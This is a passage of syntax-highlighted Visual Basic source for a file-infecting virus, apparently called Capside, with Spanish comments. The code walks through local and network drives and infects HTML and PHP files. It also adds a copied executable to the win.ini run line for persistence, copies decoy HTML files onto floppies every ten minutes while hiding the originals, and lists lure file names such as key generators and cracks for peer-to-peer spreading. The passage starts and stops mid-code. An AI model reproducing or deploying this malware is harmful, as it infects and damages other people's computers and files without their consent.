</span><span class="sc4">"Microsoft KeyGenerator-Allmost all microsoft stuff.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Netbios Nuker 2003.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Security-2003-Update.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Stripping MP3 dancer+crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Visual Basic 6.0 Msdn Plugin.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Windows Xp Exploit.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"WinRar 3.xx Password Cracker.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"WinZipped Visual C++ Tutorial.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"XNuker 2003 2.93b.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cable modem ultility pack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"macromedia dreamweaver key generator.htm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"winamp plugin pack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"winzip full version key generator.htm"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">P2PName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">P</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">'Sub que lista los discos duros y de red del sistema
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VDisk</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Vd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.Drives</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">Vdt</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">Vd</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Vdt.DriveType</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Vdt.DriveType</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">VFolder</span><span class="sc0"> </span><span class="sc7">Vdt.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub que lista los folderes del sistema
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VFolder</span><span class="sc6">(</span><span class="sc7">F</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Cfl</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.GetFolder</span><span class="sc6">(</span><span class="sc7">F</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Cfs</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cfl.Subfolders</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">Fl</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">Cfs</span><span class="sc0">
</span><span class="sc7">VFiles</span><span class="sc0"> </span><span class="sc7">Fl.Path</span><span class="sc0">
</span><span class="sc7">VFolder</span><span class="sc0"> </span><span class="sc7">Fl.Path</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub que lista los archivos y busca archivos html,htm, php,
'para infectar.
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VFiles</span><span class="sc6">(</span><span class="sc7">F</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fls</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.GetFolder</span><span class="sc6">(</span><span class="sc7">F</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Fs</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fls.Files</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">Fh</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">Fs</span><span class="sc0">
</span><span class="sc7">Fx</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">Cf.GetExtensionName</span><span class="sc6">(</span><span class="sc7">Fh.Path</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">Fn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">Fh.Name</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Cd.Exists</span><span class="sc6">(</span><span class="sc7">Fx</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">CodeH</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Fh.Path</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">ElseIf</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Fn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"win.ini"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Capside.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">F</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\CapsideRed.pif"</span><span class="sc0">
</span><span class="sc7">WIni</span><span class="sc0"> </span><span class="sc4">"windows"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"run"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">F</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\CapsideRed.pif"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Fh.Path</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para escribir en archivos ini
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">WIni</span><span class="sc6">(</span><span class="sc7">I_S</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IK</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IV</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IP</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Wn</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">Wn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WritePrivateProfileString</span><span class="sc6">(</span><span class="sc7">I_S</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IK</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IV</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IP</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Function que nos devuel las rutas de windows, system, temp
'y la ruta del virus de acuerdo al numero que le pasemos
'0,1,2,3 respectivamente
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc7">Exn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">Exn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Exn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Exn</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">Exs</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">".exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">".com"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">".pif"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">".scr"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">".bat"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">Exn</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Exs</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Exn</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Exs</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">'Sub para colocar atributos de solo lectura, oculto o sistema
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">SA</span><span class="sc6">(</span><span class="sc7">P</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">SetAttr</span><span class="sc0"> </span><span class="sc7">P</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Function que nos da un nombre de archivo aleatorio
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RndN</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">Randomize</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc7">r</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">55</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">66</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">r</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">92</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">r</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">96</span><span class="sc0">
</span><span class="sc7">RndN</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RndN</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc7">r</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">'Sub para escribir en el registro
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Rw</span><span class="sc6">(</span><span class="sc7">r</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">k</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Cw.RegWrite</span><span class="sc0"> </span><span class="sc7">r</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">k</span><span class="sc0"> </span><span class="sc3">Else</span><span class="sc0"> </span><span class="sc7">Cw.RegWrite</span><span class="sc0"> </span><span class="sc7">r</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">k</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"REG_DWORD"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Function para leer el registro
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc7">r</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">Rr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cw.RegRead</span><span class="sc6">(</span><span class="sc7">r</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">'Function para leer archivos ini
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">IniR</span><span class="sc6">(</span><span class="sc7">NS</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">NK</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ND</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">k</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">k</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">NK</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">St</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">400</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetPrivateProfileString</span><span class="sc6">(</span><span class="sc7">NS</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">k</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">St</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">St</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">ND</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">IniR</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">St</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">'Timer que llama al procedimiento para infectar disckets
'cada 10min aprox.
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Timer1_Timer</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Static</span><span class="sc0"> </span><span class="sc7">v1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">v2</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">v1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">75</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">v1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">VFloppy</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">v1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">v1</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para copiarse a los diskets
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VFloppy</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Static</span><span class="sc0"> </span><span class="sc7">XFile</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Fd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.Drives</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">FVs</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">Fd</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">FVs.DriveType</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Cf.GetDrive</span><span class="sc6">(</span><span class="sc7">FVs.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc6">).</span><span class="sc7">FreeSpace</span><span class="sc0"> </span><span class="sc6">&lt;</span><span class="sc0"> </span><span class="sc2">100000</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc7">TempFile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">FVs.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\*.*"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.GetExtensionName</span><span class="sc6">(</span><span class="sc7">FVs.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\*.*"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">TempFile</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">XFile</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">TempFile</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

</span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">TempFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">))</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"htm"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"tml"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"plg"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

</span><span class="sc7">Bn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.GetBaseName</span><span class="sc6">(</span><span class="sc7">TempFile</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\CapsideCode.htm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FVs.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Bn</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".htm"</span><span class="sc0">
</span><span class="sc7">SA</span><span class="sc0"> </span><span class="sc7">FVs.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">TempFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">XFile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TempFile</span><span class="sc0">

</span><span class="sc3">Else</span><span class="sc0">

</span><span class="sc7">Rf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"Capside.htm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Avril Lavigne.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Institucional.plg"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Bendicion.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"LosOtros.htm"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Randomize</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Ry</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Not</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Cf.FileExists</span><span class="sc6">(</span><span class="sc7">FVs.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Rf</span><span class="sc6">(</span><span class="sc7">Ry</span><span class="sc6">)))</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
